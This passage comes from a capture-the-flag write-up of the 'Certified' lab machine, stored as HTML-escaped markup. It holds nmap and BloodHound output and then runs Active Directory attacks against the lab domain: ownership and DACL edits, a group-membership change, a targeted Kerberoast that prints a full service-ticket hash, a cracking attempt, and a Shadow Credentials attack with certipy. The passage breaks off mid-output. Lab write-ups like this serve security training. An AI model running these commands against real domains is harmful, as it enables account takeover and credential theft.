-389/tcp   open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: certified.htb, Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_ssl-date: 2026-06-23T17:44:49+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +7h00m04s from scanner time.
-| ssl-cert: Subject:
-| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
-| Not valid before: 2025-06-11T21:05:29
-|_Not valid after:  2105-05-23T21:05:29
-445/tcp   open  microsoft-ds?
-464/tcp   open  kpasswd5?
-593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: certified.htb, Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_ssl-date: 2026-06-23T17:44:50+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +7h00m04s from scanner time.
-| ssl-cert: Subject:
-| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
-| Not valid before: 2025-06-11T21:05:29
-|_Not valid after:  2105-05-23T21:05:29
-3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: certified.htb, Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-| ssl-cert: Subject:
-| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
-| Not valid before: 2025-06-11T21:05:29
-|_Not valid after:  2105-05-23T21:05:29
-|_ssl-date: 2026-06-23T17:44:49+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +7h00m04s from scanner time.
-3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Domain: certified.htb, Site: Default-First-Site-Name&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_ssl-date: 2026-06-23T17:44:50+00:00&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; +7h00m04s from scanner time.
-| ssl-cert: Subject:
-| Subject Alternative Name: DNS:DC01.certified.htb, DNS:certified.htb, DNS:CERTIFIED
-| Not valid before: 2025-06-11T21:05:29
-|_Not valid after:  2105-05-23T21:05:29
-5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SSDP/UPnP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-|_http-title: Not Found
-|_http-server-header: Microsoft-HTTPAPI/2.0
-9389/tcp  open  mc-nmf        .NET Message Framing
-49666/tcp open  msrpc         Microsoft Windows RPC
-49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-49694/tcp open  msrpc         Microsoft Windows RPC
-49695/tcp open  msrpc         Microsoft Windows RPC
-49724/tcp open  msrpc         Microsoft Windows RPC
-49745/tcp open  msrpc         Microsoft Windows RPC
-49780/tcp open  msrpc         Microsoft Windows RPC
-Service Info: Host: DC01&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; OS: Windows&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/o:microsoft:windows
-
-Host script results:
-| smb2-security-mode:
-|   3.1.1:
-|_    Message signing enabled and required
-| smb2-time:
-|   &lt;span class=&quot;nb&quot;&gt;date&lt;/span&gt;: 2026-06-23T17:44:12
-|_  start_date: N/A
-|_clock-skew: mean: 7h00m03s, deviation: 0s, median: 7h00m03s
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
-Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;200.91 seconds
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;h3 id=&quot;bloodhound&quot;&gt;BloodHound&lt;/h3&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bloodhound-python &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$DOMAIN&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$USERNAME&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PASSWORD&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-ns&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; All &lt;span class=&quot;nt&quot;&gt;--zip&lt;/span&gt;
-INFO: BloodHound.py &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;BloodHound LEGACY &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;BloodHound 4.2 and 4.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-INFO: Found AD domain: certified.htb
-INFO: Getting TGT &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;user
-WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Errno Connection error &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;dc01.certified.htb:88&lt;span class=&quot;o&quot;&gt;)]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;Errno &lt;span class=&quot;nt&quot;&gt;-2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Name or service not known
-INFO: Connecting to LDAP server: dc01.certified.htb
-INFO: Found 1 domains
-INFO: Found 1 domains &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the forest
-INFO: Found 1 computers
-INFO: Connecting to LDAP server: dc01.certified.htb
-INFO: Found 10 &lt;span class=&quot;nb&quot;&gt;users
-&lt;/span&gt;INFO: Found 53 &lt;span class=&quot;nb&quot;&gt;groups
-&lt;/span&gt;INFO: Found 2 gpos
-INFO: Found 1 ous
-INFO: Found 19 containers
-INFO: Found 0 trusts
-INFO: Starting computer enumeration with 10 workers
-INFO: Querying computer: DC01.certified.htb
-INFO: Done &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;00M 06S
-INFO: Compressing output into 20260623124151_bloodhound.zip
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/certified-1.png&quot; alt=&quot;certified-1.htb&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/certified-2.png&quot; alt=&quot;certified-2.htb&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/certified-3.png&quot; alt=&quot;certified-3.htb&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/certified-4.png&quot; alt=&quot;certified-4.htb&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/img/ctf/data/certified-5.png&quot; alt=&quot;certified-5.htb&quot; /&gt;&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;h2 id=&quot;-2-initial-foothold&quot;&gt;🚪 2. Initial Foothold&lt;/h2&gt;
-
-&lt;ol&gt;
-  &lt;li&gt;
-    &lt;p&gt;Abuse &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;WriteOwner&lt;/code&gt;: set new owner, grant &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Full Control&lt;/code&gt;, add to group:&lt;/p&gt;
-
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;impacket-owneredit &lt;span class=&quot;nt&quot;&gt;-action&lt;/span&gt; write &lt;span class=&quot;nt&quot;&gt;-new-owner&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$USERNAME&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-target-dn&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;CN=MANAGEMENT,CN=Users,DC=certified,DC=htb&apos;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$DOMAIN&lt;/span&gt;/&lt;span class=&quot;nv&quot;&gt;$USERNAME&lt;/span&gt;:&lt;span class=&quot;nv&quot;&gt;$PASSWORD&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-dc-ip&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;
- Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
-
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Current owner information below
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; - SID: S-1-5-21-729746778-2675978091-3820388244-512
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; - sAMAccountName: Domain Admins
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; - distinguishedName: &lt;span class=&quot;nv&quot;&gt;CN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Domain Admins,CN&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Users,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;certified,DC&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;htb
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; OwnerSid modified successfully!
-
- &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;impacket-dacledit &lt;span class=&quot;nt&quot;&gt;-action&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;write&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-rights&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;WriteMembers&apos;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-principal&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$USERNAME&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-target-dn&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;CN=MANAGEMENT,CN=Users,DC=certified,DC=htb&apos;&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$DOMAIN&lt;/span&gt;/&lt;span class=&quot;nv&quot;&gt;$USERNAME&lt;/span&gt;:&lt;span class=&quot;nv&quot;&gt;$PASSWORD&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-dc-ip&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;
- Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
-
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; DACL backed up to dacledit-20260623-131538.bak
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; DACL modified successfully!
-
- &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;bloodyAD &lt;span class=&quot;nt&quot;&gt;--host&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$DOMAIN&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$USERNAME&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PASSWORD&lt;/span&gt; add groupMember MANAGEMENT &lt;span class=&quot;nv&quot;&gt;$USERNAME&lt;/span&gt;
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] judith.mader added to MANAGEMENT
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;p&gt;Abuse &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GenericWrite&lt;/code&gt; by performing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;targetedKerberoast&lt;/code&gt; attack:&lt;/p&gt;
-
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/opt/share/targetedKerberoast/targetedKerberoast.py &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$DOMAIN&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$USERNAME&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PASSWORD&lt;/span&gt;
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Starting kerberoast attacks
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Fetching usernames from Active Directory with LDAP
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Printing &lt;span class=&quot;nb&quot;&gt;hash &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;management_svc&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
- &lt;span class=&quot;nv&quot;&gt;$krb5tgs$23$*&lt;/span&gt;management_svc&lt;span class=&quot;nv&quot;&gt;$CERTIFIED&lt;/span&gt;.HTB&lt;span class=&quot;nv&quot;&gt;$certified&lt;/span&gt;.htb/management_svc&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$50330831fa4d4e1f209602435d226142$24add6cf77f97e75f54ed9a8fea33ad1059946e5baad876990c805b5e8f96434239126999082dd365bf5bf3184a4dd50b57be3f5c1c76cdbfd7a3dcfaf73b865959ebafa6d080d4b867b7e1f05a56eb842e076caeebab07c0ca95149a6ded46fbe0807fbf6b8cb294d422b8e45fe4d12644da4f351d4da1ba073115e771ce7ff265febb16e46fe4ff6474086101845f390bf8d7da7b3f7eb93f179d5fcfed047e5124eb95f43b49764fd5051d5b8dab6057f8973e18fa8e2970d34fe8eea37c16a50fea690dcca8172eccc78e908acd8844b87fe4a8388fb15832f72b8de5b201545abd1b88dd9f0b70bfbc108a2bbe52456781f314c7a00a3554790d92bed04747106fd07c7a1fe1fbf0ef618d5aac0b24040c7d5c1efe1bd9cb90c9a068db48bded5da3582546cb67f4b41d229f2f29655e8eeb07d9605a938df4bf4f6308d3df15fdcaebf8ae7179b16b01f95d2f9b1432d25e2fa1154e8170a117ced8fe4d64745106deadaefd0f7fdb194f7e76baeac8cc72859d87f429a2e139972ac26db7f90425fcd3675dc4434145bb70c1fca948a7634e71a4fde291e21636b2805bd180fbd0f9e8bdfad8471110fbdc2e4bdfa8eaeef68b1e44d67d6f62640a5c93ee83f7b231b44c46a79972471659c1abbd8eec94e9c234ac7c5b4763ffb0e1bb0d36322d234ed774900d9f80cd10d221c1b81a5f409e9cbf1165ec89b5132dbd991eca0bc3c90e140d97156e4ace837b048ad6ad71e9849bb12a4c8af906dcce5360b6c94e25bad081f2b8cf2db62437c9b8e6bdc405f4d880d206dda8f5c202296dc5144a92c667f94818faff97a46e5d2fa57317141f266ff1d62f62c0e08a21de2183bacd86a2d6f7bdb5512307035cfdc83afd5a48c710018c0466573da96f99bc7dab59385ac3de7d7859ed368f4646e362fe9d8317e3a5f15c57e130c25830ee9c73aad045624dcfaf12262ef1a35931403a6a86f6d8f8c31439ecf1eb9ec1665d7920990aebc65f781fc8f1cf951e3c73ecfbe769f971e65cb344825e5bd2179e951c70af953cec4985dd7a620ddcf362b7c659655adab10ada927476f073c70c6a96f9df59e64524fdfd9f128740643f38960849034fde5080271363f8a337ed52b43dde00be4e2341497a8b752fa2dfae13eb663ba61f53d63de0f98a7e0cf592bbeecc1273421536fea231cbd7063bd018b4905f18f36b8bccc026e3ccefc4917810745c07e56cbd6ccec7833a53f01b6c44e693f674ebc5292935650af6d1b87c3095754e878040ebfa65ab63b78a774fef19ae862533286773953a098dd01bbd84831c6e494e8d8ef825f91a17d838a8e74c2fb843810f4378ac2a44f860742e421a24250cc671064f7788ea43b56ad641364bbe1ad3160c2ae56aa4d90514a279f99843670527568d55fe483f654fcd3a7f7bc7f99df8cc5cdcae983cc23c9b069527c46269865741995fff88af6354a874ede5ffc01401d2224984e5f1ccfc45d5482d55eb1c1b89970d3bff588df66abd15f7f70472a638ca9f1e95b7360a65d2fc72492708b370f1f63c494f527e3379a95c8aa0bb75329a640&lt;/span&gt;
-
- &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;$krb5tgs$23$*management_svc$CERTIFIED.HTB$certified.htb/management_svc*$50330831fa4d4e1f209602435d226142$24add6cf77f97e75f54ed9a8fea33ad1059946e5baad876990c805b5e8f96434239126999082dd365bf5bf3184a4dd50b57be3f5c1c76cdbfd7a3dcfaf73b865959ebafa6d080d4b867b7e1f05a56eb842e076caeebab07c0ca95149a6ded46fbe0807fbf6b8cb294d422b8e45fe4d12644da4f351d4da1ba073115e771ce7ff265febb16e46fe4ff6474086101845f390bf8d7da7b3f7eb93f179d5fcfed047e5124eb95f43b49764fd5051d5b8dab6057f8973e18fa8e2970d34fe8eea37c16a50fea690dcca8172eccc78e908acd8844b87fe4a8388fb15832f72b8de5b201545abd1b88dd9f0b70bfbc108a2bbe52456781f314c7a00a3554790d92bed04747106fd07c7a1fe1fbf0ef618d5aac0b24040c7d5c1efe1bd9cb90c9a068db48bded5da3582546cb67f4b41d229f2f29655e8eeb07d9605a938df4bf4f6308d3df15fdcaebf8ae7179b16b01f95d2f9b1432d25e2fa1154e8170a117ced8fe4d64745106deadaefd0f7fdb194f7e76baeac8cc72859d87f429a2e139972ac26db7f90425fcd3675dc4434145bb70c1fca948a7634e71a4fde291e21636b2805bd180fbd0f9e8bdfad8471110fbdc2e4bdfa8eaeef68b1e44d67d6f62640a5c93ee83f7b231b44c46a79972471659c1abbd8eec94e9c234ac7c5b4763ffb0e1bb0d36322d234ed774900d9f80cd10d221c1b81a5f409e9cbf1165ec89b5132dbd991eca0bc3c90e140d97156e4ace837b048ad6ad71e9849bb12a4c8af906dcce5360b6c94e25bad081f2b8cf2db62437c9b8e6bdc405f4d880d206dda8f5c202296dc5144a92c667f94818faff97a46e5d2fa57317141f266ff1d62f62c0e08a21de2183bacd86a2d6f7bdb5512307035cfdc83afd5a48c710018c0466573da96f99bc7dab59385ac3de7d7859ed368f4646e362fe9d8317e3a5f15c57e130c25830ee9c73aad045624dcfaf12262ef1a35931403a6a86f6d8f8c31439ecf1eb9ec1665d7920990aebc65f781fc8f1cf951e3c73ecfbe769f971e65cb344825e5bd2179e951c70af953cec4985dd7a620ddcf362b7c659655adab10ada927476f073c70c6a96f9df59e64524fdfd9f128740643f38960849034fde5080271363f8a337ed52b43dde00be4e2341497a8b752fa2dfae13eb663ba61f53d63de0f98a7e0cf592bbeecc1273421536fea231cbd7063bd018b4905f18f36b8bccc026e3ccefc4917810745c07e56cbd6ccec7833a53f01b6c44e693f674ebc5292935650af6d1b87c3095754e878040ebfa65ab63b78a774fef19ae862533286773953a098dd01bbd84831c6e494e8d8ef825f91a17d838a8e74c2fb843810f4378ac2a44f860742e421a24250cc671064f7788ea43b56ad641364bbe1ad3160c2ae56aa4d90514a279f99843670527568d55fe483f654fcd3a7f7bc7f99df8cc5cdcae983cc23c9b069527c46269865741995fff88af6354a874ede5ffc01401d2224984e5f1ccfc45d5482d55eb1c1b89970d3bff588df66abd15f7f70472a638ca9f1e95b7360a65d2fc72492708b370f1f63c494f527e3379a95c8aa0bb75329a640&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; management_svc
-
- &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;john &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/usr/share/wordlists/rockyou.txt ./management_svc
- Loaded 1 password &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;krb5tgs, Kerberos 5 TGS etype 23 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;MD4 HMAC-MD5 RC4]&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
- Will run 8 OpenMP threads
- Press &lt;span class=&quot;s1&quot;&gt;&apos;q&apos;&lt;/span&gt; or Ctrl-C to abort, almost any other key &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;status
- 0g 0:00:00:07 DONE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;2026-06-23 20:19&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 0g/s 1975Kp/s 1975Kc/s 1975KC/s &lt;span class=&quot;o&quot;&gt;!)(&lt;/span&gt;OPPQR..&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;7¡Vamos!
- Session completed.
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
-
-    &lt;p&gt;Unfortunetaly we couldn’t crack the hash (which was predictable), so let’s perform a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Shadow Credentials&lt;/code&gt; attack:&lt;/p&gt;
-
-    &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;certipy-ad shadow auto &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$USERNAME&lt;/span&gt;@&lt;span class=&quot;nv&quot;&gt;$DOMAIN&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$PASSWORD&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-account&lt;/span&gt; management_svc &lt;span class=&quot;nt&quot;&gt;-target&lt;/span&gt; dc01.&lt;span class=&quot;nv&quot;&gt;$DOMAIN&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-dc-ip&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$IP&lt;/span&gt;
- Certipy v5.0.4 - by Oliver Lyak &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;ly4k&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Targeting user &lt;span class=&quot;s1&quot;&gt;&apos;management_svc&apos;&lt;/span&gt;
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Generating certificate
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Certificate generated
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Generating Key Credential
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Key Credential generated with DeviceID &lt;span class=&quot;s1&quot;&gt;&apos;1f4dd96008d34bb7b039d0a0f529c403&apos;&lt;/span&gt;
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Adding Key Credential with device ID &lt;span class=&quot;s1&quot;&gt;&apos;1f4dd96008d34bb7b039d0a0f529c403&apos;&lt;/span&gt; to the Key Credentials &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;management_svc&apos;&lt;/span&gt;
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Successfully added Key Credential with device ID &lt;span class=&quot;s1&quot;&gt;&apos;1f4dd96008d34bb7b039d0a0f529c403&apos;&lt;/span&gt; to the Key Credentials &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;management_svc&apos;&lt;/span&gt;
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Authenticating as &lt;span class=&quot;s1&quot;&gt;&apos;management_svc&apos;&lt;/span&gt; with the certificate
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Certificate identities:
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;     No identities found &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;this certificate
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Using principal: &lt;span class=&quot;s1&quot;&gt;&apos;management_svc@certified.htb&apos;&lt;/span&gt;
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Trying to get TGT...
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Got TGT
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Saving credential cache to &lt;span class=&quot;s1&quot;&gt;&apos;management_svc.ccache&apos;&lt;/span&gt;
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Wrote credential cache to &lt;span class=&quot;s1&quot;&gt;&apos;management_svc.ccache&apos;&lt;/span&gt;
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Trying to retrieve NT &lt;span class=&quot;nb&quot;&gt;hash &lt;/span&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;management_svc&apos;&lt;/span&gt;
- &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Restoring the old Key Credentials &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;management_svc&apos;&lt;/span&gt;
